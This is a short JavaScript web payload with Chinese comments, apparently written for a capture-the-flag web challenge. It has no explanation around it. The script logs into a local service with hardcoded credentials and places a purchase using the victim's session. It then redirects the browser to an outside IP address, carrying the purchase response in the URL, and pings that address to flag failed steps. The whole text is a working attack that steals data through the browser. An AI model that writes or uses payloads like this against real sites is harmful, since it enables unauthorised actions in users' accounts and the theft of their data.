!(function() {
    // 登录步骤
    fetch('http://127.0.0.1/login', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'username=test44&password=12345678'
    })
    .then(response => {
        if (!response.ok) {
            // 如果登录失败，GET请求你的网站进行标记
            fetch('http://120.26.103.53/1');
            throw new Error('Login failed');
        }
        return response.text();
    })
    .then(() => {
        // 购买商品步骤
        return fetch('http://127.0.0.1/buy', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'id=0' // 假设id=0是我们想要购买的商品
        });
    })
    .then(response => {
        if (!response.ok) {
            // 如果购买失败，GET请求你的网站进行标记
            fetch('http://120.26.103.53/2');
            throw new Error('Buy operation failed');
        }
        return response.text();
    })
    .then(result => {
        // 使用购买结果构建URL并访问
        const data = encodeURIComponent(result);
        window.location.href = `http://120.26.103.53/para?data=${data}`;
    })
    .catch(error => {
        console.error(error);
        // 在这里也可以根据错误的不同发送到不同的URL进行标记
        // 例如: fetch('http://120.26.103.53/3');
    });
})();
